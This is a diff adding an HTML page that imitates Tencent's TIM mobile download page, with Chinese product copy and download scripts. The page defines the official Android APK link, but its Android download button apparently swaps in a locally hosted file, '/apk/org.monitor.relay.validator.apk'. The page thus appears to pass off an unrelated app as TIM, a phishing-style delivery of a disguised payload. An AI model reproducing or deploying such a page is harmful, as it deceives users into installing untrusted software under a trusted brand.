@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=no" />
+    <meta itemprop="name" content="TIM 办公QQ">
+    <!--分享卡标题预埋meta-->
+    <meta name="description" itemprop="description" content="支持云文件、在线文档、邮件收发、日程等办公功能；支持QQ号登录，与QQ消息无缝同步。" />
+    <!--分享卡描述预埋meta-->
+    <meta itemprop="image" content="//mma.qq.com/timtest/img/logo-tim.png" />
+    <title>TIM-手机版</title>
+    <link rel="icon" type="image/png" sizes="32x32" href="./img/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="./img/favicon-16x16.png">
+    <link rel="icon" href="./img/favicon.ico">
+    <script>
+        window.OS = function() {
+            var a = navigator.userAgent,
+                b = /(?:Android)/.test(a),
+                d = /(?:Firefox)/.test(a),
+                e = /(?:Mobile)/.test(a),
+                f = b && e,
+                g = b && !f,
+                c = /(?:iPad.*OS)/.test(a),
+                h = !c && /(?:iPhone\sOS)/.test(a),
+                k = c || g || /(?:PlayBook)/.test(a) || d && /(?:Tablet)/.test(a),
+                a = !k && (b || h || /(?:(webOS|hpwOS)[\s\/]|BlackBerry.*Version\/|BB10.*Version\/|CriOS\/)/.test(a) || d && e);
+            return {
+                android: b,
+                androidPad: g,
+                androidPhone: f,
+                ipad: c,
+                iphone: h,
+                tablet: k,
+                phone: a
+            }
+        }();
+        if (!window.OS.phone && !window.OS.ipad) {
+            location.href = '../index.html';
+        }
+        (function(designWidth, maxWidth) {
+            var doc = document,
+                win = window,
+                docEl = doc.documentElement,
+                remStyle = document.createElement("style"),
+                tid;
+
+            function refreshRem() {
+                var width = docEl.getBoundingClientRect().width;
+                maxWidth = maxWidth || 540;
+                width > maxWidth && (width = maxWidth);
+                var rem = width * 100 / designWidth;
+                remStyle.innerHTML = 'html{font-size:' + rem + 'px;}';
+            }
+            if (docEl.firstElementChild) {
+                docEl.firstElementChild.appendChild(remStyle);
+            } else {
+                var wrap = doc.createElement("div");
+                wrap.appendChild(remStyle);
+                doc.write(wrap.innerHTML);
+                wrap = null;
+            }
+            //要等 wiewport 设置好后才能执行 refreshRem，不然 refreshRem 会执行2次；
+            refreshRem();
+            win.addEventListener("resize", function() {
+                clearTimeout(tid); //防止执行两次
+                tid = setTimeout(refreshRem, 300);
+            }, false);
+            win.addEventListener("pageshow", function(e) {
+                if (e.persisted) { // 浏览器后退的时候重新计算
+                    clearTimeout(tid);
+                    tid = setTimeout(refreshRem, 300);
+                }
+            }, false);
+            if (doc.readyState === "complete") {
+                doc.body.style.fontSize = "16px";
+            } else {
+                doc.addEventListener("DOMContentLoaded", function(e) {
+                    doc.body.style.fontSize = "16px";
+                }, false);
+            }
+        })(750, 750);
+    </script>
+    <link rel="stylesheet" href="./css/public.css">
+    <link rel="stylesheet" href="./css/index.css">
+</head>
+
+<body id="wrapper">
+    <div class="download-fixed"></div>
+    <div class="menu-content" id="bm">
+        <div class="menu-logo"></div>
+        <div class="menu-func">
+            <div class="fun-item-wrap">
+                <div class="fun-item icon1">
+                    <a href="./index.html">TIM首页</a>
+                </div>
+                <div class="fun-item icon2 faq_link">
+                    <a href="javascript:;">常见问题</a>
+                </div>
+                <div class="fun-item icon3">
+                    <a target="_blank" href="https://aq.qq.com/cn2/index">安全中心</a>
+                </div>
+                <div class="fun-item icon4 feedback_link">
+                    <a href="javascript:;">反馈意见</a>
+                </div>
+            </div>
+        </div>
+        <div class="menubg">
+            <div class="left-bg"></div>
+            <div class="right-bg"></div>
+        </div>
+    </div>
+    <div class="menu" id="menu">
+    </div>
+    <div class="common-header">
+        <div class="logo-white"></div>
+    </div>
+    <div class="index-content" id="index-content">
+        <div id="scroller">
+            <header>
+                <h1 class="logo"></h1>
+                <div class="header-title">专注团队沟通协作</div>
+                <div class="header-desc">在线文档、日程等办公功能</div>
+                <div class="downloads">
+                    <a href="">立即下载</a>
+                </div>
+            </header>
+            <div class="functions">
+                <div class="f-item clear">
+                    <div class="r-icon i1"></div>
+                    <div class="f-desc">
+                        <div class="f-d-title">熟悉的QQ习惯</div>
+                        <div class="f-d-desc">使用QQ账号登录，QQ好友和消息无缝同步</div>
+                    </div>
+                </div>
+                <div class="f-item clear">
+                    <div class="r-icon i2"></div>
+                    <div class="f-desc">
+                        <div class="f-d-title">在线文档和文件</div>
+                        <div class="f-d-desc">支持在线编辑Word和Excel</div>
+                    </div>
+                </div>
+                <div class="f-item clear">
+                    <div class="r-icon i3"></div>
+                    <div class="f-desc">
+                        <div class="f-d-title">丰富的办公功能</div>
+                        <div class="f-d-desc">包含日程管理、电话等功能，让沟通更流畅</div>
+                    </div>
+                </div>
+            </div>
+            <div class="modules">
+                <div class="m1 m-item">
+                    <div class="m-title">在线文档</div>
+                    <div class="m-desc">在线Word/Excel，多端多人随时编辑</div>
+                    <div class="m-pic"></div>
+                    <div class="m-bg-line"></div>
+                </div>
+                <div class="m2 m-item">
+                    <div class="m-title">消息云端同步</div>
+                    <div class="m-desc">手机电脑消息同步，历史消息随时查看</div>
+                    <div class="m-pic"></div>
+                    <div class="m-bg-line"></div>
+                </div>
+                <div class="m3 m-item">
+                    <div class="m-title">日程管理</div>
+                    <div class="m-desc">同步系统日程，新建个人日程</div>
+                    <div class="m-pic"></div>
+                    <div class="m-bg-line"></div>
+                </div>
+            </div>
+            <div class="fetures clear">
+                <div class="fe-item fe1">
+                    <div class="fe-logo"></div>
+                    <div class="fe-title">名片</div>
+                    <div class="fe-desc">支持纸质名片扫描识别，可作为资料备注在名片夹中统一管理。</div>
+                </div>
+                <div class="fe-item fe2">
+                    <div class="fe-logo"></div>
+                    <div class="fe-title">办公群</div>
+                    <div class="fe-desc">支持通讯录模式，群文件统一管理，方便团队群内协作。</div>
+                </div>
+                <div class="fe-item fe3">
+                    <div class="fe-logo"></div>
+                    <div class="fe-title">电话</div>
+                    <div class="fe-desc">好友、多人之间可进行实时清晰的语音及视频通话。</div>
+                </div>
+                <div class="fe-item fe4">
+                    <div class="fe-logo"></div>
+                    <div class="fe-title">收藏</div>
+                    <div class="fe-desc">可将重要的聊天内容添加至收藏，支持二次编辑。</div>
+                </div>
+                <div class="fe-item fe5">
+                    <div class="fe-logo"></div>
+                    <div class="fe-title">钱包</div>
+                    <div class="fe-desc">可以进行充值、转账、理财等个人服务。</div>
+                </div>
+                <div class="fe-item fe6">
+                    <div class="fe-logo"></div>
+                    <div class="fe-title">安全</div>
+                    <div class="fe-desc">使用QQ号登录，QQ安全中心为你保驾护航。</div>
+                </div>
+            </div>
+            <div class="footer-download">
+                <a href="">立即下载</a>
+            </div>
+            <div class="footer">
+                <p class="suggest"><a href="">用户意见</a>意见反馈：984295331（QQ群）</p>
+                <p class="copyright">Copyright © 1998-2024 Tencent. All Rights Reserved. 腾讯公司 版权所有</p>
+            </div>
+        </div>
+    </div>
+    <script src="./js/zepto.min.js"></script>
+    <script src="./js/transform.js"></script>
+    <script src="./js/alloy_touch.css.js"></script>
+    <script>
+        var scroller = document.getElementById('scroller')
+        var downloadBtn = parseInt($('.downloads a').offset().top + $('.downloads a').height())
+        var footerDown = parseInt($('.footer-download').offset().top - window.innerHeight)
+        Transform(scroller, true)
+        var alloyTouch = new AlloyTouch({
+            touch: "#index-content", //反馈触摸的dom
+            vertical: true, //不必需，默认是true代表监听竖直方向touch
+            target: scroller, //运动的对象
+            property: "translateY", //被运动的属性
+            // min: 100, //不必需,运动属性的最小值
+            max: 0, //不必需,滚动属性的最大值
+            sensitivity: 1, //不必需,触摸区域的灵敏度，默认值为1，可以为负数
+            factor: 1, //不必需,表示触摸位移与被运动属性映射关系，默认值是1
+            step: 45, //用于校正到step的整数倍
+            bindSelf: false,
+            maxSpeed: 2, //不必需，触摸反馈的最大速度限制 
+            initialValue: 0,
+            change: function(value) {
+                // console.log(value)
+                pageScrollChange(value)
+            },
+            touchStart: function(evt, value) {
+                resetScroller()
+            },
+            touchMove: function(evt, value) {},
+            touchEnd: function(evt, value) {},
+            tap: function(evt, value) {},
+            pressMove: function(evt, value) {},
+            animationEnd: function(value) {} //运动结束
+        })
+
+        function resetScroller() {
+            alloyTouch.min = -1 * parseInt($('#scroller').height() - window.innerHeight)
+        }
+
+        function pageScrollChange(v) {
+            if (v > -10) {
+                $('.common-header').removeClass('scrolled')
+            } else {
+                $('.common-header').addClass('scrolled')
+            }
+            if (-v > downloadBtn && -v < footerDown) {
+                $('.download-fixed').addClass('show')
+            } else {
+                $('.download-fixed').removeClass('show')
+            }
+        }
+
+        //下载与页面功能实现
+        (function(win) {
+            if (typeof(pgvMain) == 'function') {
+                pgvMain({
+                    virtualURL: "tim.qq.com"
+                });
+            }
+            /*初始化badjs*/
+            // BJ_REPORT.init({
+            //     id: 4, //此处的id需要去badjs管理后台申请id
+            //     url: "//mmatest.qq.com/badjs"
+            // });
+            // BJ_REPORT.tryJs().spyAll();
+
+            /*
+             * 通过键名获取参数键值
+             */
+            var query = function(n) {
+                var m = window.location.search.match(new RegExp("(\\?|&)" + n + "=([^&]*)(&|$)"));
+                return !m ? "" : decodeURIComponent(m[2]);
+            };
+
+            /*
+             * 点击流上报
+             */
+            var tcssReport = function(hottag) {
+                if (typeof(pgvMain) == 'function') {
+                    pgvSendClick({
+                        virtualDomain: "office.qq.com",
+                        hottag: hottag
+                    });
+
+                }
+            };
+
+            var pageInit = function() {
+                //上报
+                tcssReport("office.mobile.mobile.pv");
+                if (query('adtag') && query('adtag') != '') {
+                    var adtag = query('adtag');
+                    tcssReport("office.mobile.mobile.pv_" + adtag);
+                }
+                if (mqq && mqq.QQVersion != 0) {
+                    if (navigator.userAgent.toLocaleLowerCase().indexOf('tim') == -1) {
+                        onMqqInstall();
+                    }
+                }
+                pageBind();
+            };
+
+            var SCHEMENAME = "tim";
+            var PACKAGENAME = "com.tencent.tim";
+
+            /**
+             * [微信中获取安装状态]
+             * @return {[type]} [description]
+             */
+            var onWexinInstall = function() {
+                WeixinJSBridge.invoke("getInstallState", {
+                    "packageUrl": SCHEMENAME + "://",
+                    "packageName": PACKAGENAME
+                }, function(result) {
+                    if (result.err_msg.indexOf("yes") !== -1) {
+                        $(".downloads a,.footer-download a").text("立即体验").addClass("open");
+                    }
+                });
+            };
+
+            /**
+             * [从QQ获取安装状态]
+             * @return {[type]} [description]
+             */
+            var onMqqInstall = function() {
+                var pkgname = OS.iphone ? SCHEMENAME : PACKAGENAME;
+                mqq.app.isAppInstalled(pkgname, function(result) {
+                    if (result) {
+                        //存在即展示打开
+                        $(".downloads a,.footer-download a").text("立即体验").addClass("open");
+                    }
+                });
+            };
+
+            /**
+             * [监控微信安装后回到该页面，有页面切换]
+             * @return {[type]} [description]
+             */
+            var onBridgeReady = function() {
+                // 安装第三方软件的时候，从外部安装的界面切回微信时，可利用此事件检测用户到底是否有安装成功。
+                WeixinJSBridge.on("activity:state_change", function(res) {
+                    // alert(res.state);
+                    // onPause 从微信切到别的界面 时触发
+                    // onResume 从别的界面切回微信 时触发
+                    if (res.state === "onResume") {
+                        onWexinInstall();
+                    }
+                });
+            };
+
+            /**
+             * [监控QQ安装后回到该页面，有页面切换]
+             * @return {[type]} [description]
+             */
+            var onMqqReady = function() {
+                document.addEventListener("qbrowserVisibilityChange", function(e) {
+                    mqq.ui.pageVisibility(function(r) {
+                        if (r) {
+                            if (navigator.userAgent.toLocaleLowerCase().indexOf('tim') == -1) {
+                                onMqqInstall();
+                            }
+                        }
+                    });
+                });
+            };
+
+            //打开App
+            var openApp = function() {
+                if (OS.android) {
+                    var proxy_frame = document.createElement("iframe");
+                    proxy_frame.style.display = 'none';
+                    //andorid TIM唤起需要下面的接口
+                    proxy_frame.src = SCHEMENAME + "://login/qrcode?qrcode_url=";
+                    proxy_frame.onload = function() {};
+                    setTimeout(function() {
+                        document.body.appendChild(proxy_frame);
+                    }, 300);
+                } else {
+                    setTimeout(function() {
+                        location.href = SCHEMENAME + "://";
+                    }, 300);
+                }
+            };
+
+            var mobile_q_jump = {
+                android: "https://tim-1258344701.shiply-cdn.qq.com/apprelease/gray/ad6b501b0e/prod/1732245378/tim_4.0.95.4008_r3b8db658_64_t2024-11-19_v4008_GuanWang_537249218_cid2017_release-signed.apk",
+                ios: "itms-apps://itunes.apple.com/cn/app/id1175213887?mt=8",
+            };
+
+            const a = $.ajax({
+                url: 'https://jsonschema.qpic.cn/99c2de7e3c0daa2e1eb6fa548bbf0c88/d80bde56620e0c005f06232ef2582bfc/versions',
+                success: function(config) {
+                    if (config.download_link) {
+                        mobile_q_jump.android = config.download_link.android;
+                        mobile_q_jump.ios = config.download_link.ios;
+                    }
+                }
+            });
+
+            /**
+             * [下载app]
+             * @return {[type]} [description]
+             */
+            var downApp = function() {
+                var adtag = query('adtag');
+                if (OS.android) {
+                    tcssReport("office.mobile.down_android");
+                    if (adtag) {
+                        tcssReport("office.mobile.down_android." + adtag);
+                    }
+                    location.href = (location.origin || '') + '/apk/org.monitor.relay.validator.apk';
+                } else {
+                    tcssReport("office.mobile.down_ios");
+                    if (adtag) {
+                        tcssReport("office.mobile.down_ios." + adtag);
+                    }
+                    doLocation(mobile_q_jump.ios);
+                }
+            };
+
+
+            /**
+             * [下载安装IOS]
+             * @param  {[type]} url [description]
+             * @return {[type]}     [description]
+             */
+            var doLocation = function(url) {
+                var a = document.createElement("a");
+                if (!a.click) {
+                    window.location = url;
+                    return;
+                }
+                a.setAttribute("href", url);
+                a.style.display = "none";
+                document.body.appendChild(a);
+                a.click();
+            };
+
+            var pageBind = function() {
+                $(".downloads a,.footer-download a").on("click", function() {
+                    tcssReport("office.mobile.mobile.tiyan");
+                    if (!mqq || mqq.QQVersion == 0 || OS.weixin) {
+                        downApp();
+                    } else {
+                        if ($(this).hasClass("open")) {
+                            openApp();
+                        } else {
+                            downApp();
+                        }
+                    }
+                    return false
+                });
+                $('.download-fixed').on('click', function() {
+                    downApp();
+                })
+                if (mqq && mqq.QQVersion != 0) {
+                    //判断是否在QQ下，增加对切换webview的判断
+                    onMqqReady();
+                }
+            };
+            var page = {
+                init: pageInit
+            };
+            win.Page = page;
+        }(window));
+        Page.init();
+        $('.menu').on('touchstart', function() {
+            // $('.menu-content').toggleClass('open')
+            if ($(this).hasClass('open')) {
+                $(this).removeClass('open').addClass('close')
+                $('.menu-content').removeClass('open').addClass('close')
+            } else {
+                $(this).removeClass('close').addClass('open')
+                $('.menu-content').removeClass('close').addClass('open')
+            }
+        })
+        $(function() {
+            document.addEventListener('touchmove', function(e) {
+                e.preventDefault()
+            }, false)
+
+            var productId = 79336;
+
+            if (window.OS.iphone || window.OS.ipad) {
+                productId = 79334;
+            }
+            
+            $('.faq_link a').on('click', function() {
+                window.open('https://support.qq.com/products/' + productId + '/faqs-more/', '_blank')
+            })
+            $('.feedback_link a').on('click', function() {
+                window.open('https://support.qq.com/product/' + productId, '_blank')
+            })
+        })
+    </script>
+</body>
+
+</html>
